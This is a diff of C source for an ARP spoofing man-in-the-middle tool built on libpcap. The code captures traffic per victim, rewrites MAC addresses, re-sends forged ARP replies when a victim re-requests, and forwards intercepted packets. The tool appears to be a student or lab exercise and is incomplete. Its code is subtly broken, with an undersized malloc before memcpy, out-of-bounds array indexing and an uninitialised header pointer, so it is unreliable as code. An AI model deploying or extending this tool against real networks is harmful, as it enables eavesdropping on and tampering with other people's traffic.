@@ -1,9 +1,7 @@
 #include "arp_lib.h"
 
+
 /////////////////////////////////////
-struct in_addr* sender_list;
-struct in_addr* target_list;
-int spoof_num;
 /////////////////////////////////////
 
 struct __attribute__((packed)) rs_packet
@@ -19,28 +17,17 @@ struct __attribute__((packed)) rs_packet
 	}data;
 };
 
-struct packet_list
-{
-	const u_char* data;
-	struct packet_list* next;
-}
-
-struct distribute_packet
-{
-	struct packet_list** packet;
-}
 //////////////////////////////////////
 
-struct distribute_packet p_list;
 
 //////////////////////////////////////
 
 
-struct packet_list* CREATE_packet(const u_char* pointer, int size)
+struct packet_list* CREATE_packet(u_char* pointer, int size)
 {
 	struct packet_list *tmp;
-	tmp = (struct packet_list*)malloc(sizeof(struct pakcet_list));
-	tmp->data = (const u_char*)malloc(sizeof(size));
+	tmp = (struct packet_list*)malloc(sizeof(struct packet_list));
+	tmp->data = (u_char*)malloc(sizeof(size));
 	memcpy(tmp->data, pointer, size);
 	tmp->next = NULL;
 	return tmp;
@@ -49,12 +36,21 @@ struct packet_list* CREATE_packet(const u_char* pointer, int size)
 struct packet_list* POP_packet(struct distribute_packet* list, int id)
 {
 	struct packet_list *tmp;
-	tmp = list->packet[i];
+	tmp = list->packet[id];
+	if(tmp == NULL)
+	{
+		return NULL;
+	}
 	list->packet[id] = tmp->next;
 	return tmp;
 }
+void destroy_packet(struct packet_list* ppacket)
+{
+	free(ppacket->data);
+	free(ppacket);
+}
 
-void APPEND_packet(struct distribute_packet** list, int id, struct packet_list* next)
+void APPEND_packet(struct distribute_packet* list, int id, struct packet_list* next)
 {
 	struct packet_list *tmp;
 	tmp = list->packet[id];
@@ -139,7 +135,7 @@ void get_senders_mac(pcap_t *handle, struct in_addr* sender_IP, uint8_t MAC_addr
 	}
 }
 
-void distribute_packet(handle)
+void distribute_packet(void* a)
 {
 	const u_char* p_data;
 	struct pcap_pkthdr *header;
@@ -148,10 +144,14 @@ void distribute_packet(handle)
 	struct rs_packet* arp_header;
 	struct in_addr source_ip;
 	struct in_addr dest_ip;
+	pcap_t *handle;
 	int i;
+
+	handle = (pcap_t*)a;
 	
-	p_list = (struct distribute_packet**)malloc(sizeof(packet_list*) * spoof_num);
-	
+	//p_list = (struct distribute_packet*)malloc(sizeof(struct distribute_packet));
+	p_list.packet = (struct packet_list**)malloc(sizeof(struct packet_list*)*spoof_num);
+	printf("[*]start packet distributing!\n");
 	while(1)
 	{
 		pcap_next_ex(handle, &header, &p_data);
@@ -162,9 +162,9 @@ void distribute_packet(handle)
 			ip_header = (struct ip*)(p_data + 14);
 			for(i=0;i < spoof_num ; i++)
 			{
-				if(sender_list[i].s_addr == (ip_hedaer->ip_src).s_addr || sender_list[i].s_addr == (ip_header->ip_dst).s_addr)
+				if(sender_list[i].s_addr == (ip_header->ip_src).s_addr || sender_list[i].s_addr == (ip_header->ip_dst).s_addr)
 				{
-					APPEND_packet(p_list,i,CREATE_packet(p_data,header->len));
+					APPEND_packet(&p_list,i,CREATE_packet((u_char*)p_data,header->len));
 					break;
 				}
 			}
@@ -177,7 +177,7 @@ void distribute_packet(handle)
 			{
 				if(sender_list[i].s_addr == (arp_header->data).sip || sender_list[i].s_addr == (arp_header->data).dip)
 				{
-					APPEND_packet(p_list,i,CREATE_packet(p_data,header->len))
+					APPEND_packet(&p_list,i,CREATE_packet((u_char *)p_data,header->len));
 					break;
 				}
 			}
@@ -188,7 +188,7 @@ void distribute_packet(handle)
 }
 
 
-int mod_packet(const u_char* mod_pointer, uint8_t my_MAC[6], uint8_t senders_MAC[6], uint8_t target_MAC[6])
+int mod_packet(u_char* mod_pointer, uint8_t my_MAC[6], uint8_t senders_MAC[6], uint8_t target_MAC[6])
 {
 	struct ether_header *eth_header;
 	
@@ -198,11 +198,11 @@ int mod_packet(const u_char* mod_pointer, uint8_t my_MAC[6], uint8_t senders_MAC
 	{
 		if(!memcmp(eth_header->ether_shost,target_MAC,6))
 		{
-			return 2;
+			return 3;
 		}
 		else if(!memcmp(eth_header->ether_shost, senders_MAC,6))
 		{
-			return 3;
+			return 2;
 		}
 
 	}
@@ -225,34 +225,51 @@ int mod_packet(const u_char* mod_pointer, uint8_t my_MAC[6], uint8_t senders_MAC
 }
 
 
-void spoofing(pcap_t *handle, uint8_t target_MAC[6], uint8_t senders_MAC[6], uint8_t my_MAC[6])
+void spoofing(void* t)// uint8_t target_MAC[6], uint8_t senders_MAC[6], uint8_t my_MAC[6])
 {
 	const u_char *p_data;
 	struct pcap_pkthdr *header;
-	const u_char *mod_pointer;
+	u_char *mod_pointer;
 	uint8_t broadcast_MAC[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
 	int mod_status;
-
+	struct packet_list* packet;
+	pcap_t* handle;
+	targ* p;
+	int id;
+	p = (targ*)t;
+	handle = (pcap_t*)p->h;
+	id = (int)p->num;
+	
+	printf("[*]start %dst spoofing!\n");
 	while(1)
 	{
-		pcap_next_ex(handle, &header, &p_data);
-		mod_pointer = (const u_char*)malloc(header->len);
+		if(p_list.packet[id] == NULL)
+		{
+			continue;
+		}
+		packet = POP_packet(&p_list, id);
+		if(packet == NULL)
+		{
+			continue;
+		}
+		mod_pointer = packet->data;
 		
-		mod_status = mod_packet(mod_pointer, my_MAC, senders_MAC, target_MAC);
-		if(status == 2)
+		mod_status = mod_packet(mod_pointer, my_MAC, sender_MAC[id], target_MAC[id]);
+		
+		if(mod_status == 2)//if sender request
 		{
-			
+			rs_ARP(handle, my_MAC, sender_MAC[6], &target_list[id],&sender_list[id],2); //send ARP again
 		}
-		else if(status == 3)
+		else if(mod_status == 3)
 		{
-			
+			rs_ARP(handle,my_MAC, target_MAC[6],&sender_list[id],&target_list[id],2);
 		}
-		else if(status)
+		else if(mod_status)
 		{
-			pcap_sendpacket(handle, mod_pointer, header->len);
+			pcap_sendpacket(handle,(const u_char*)mod_pointer, header->len);
 		}
-
-		free((void*)mod_pointer);
+		
+		destroy_packet(packet);
 	}	
 }
 
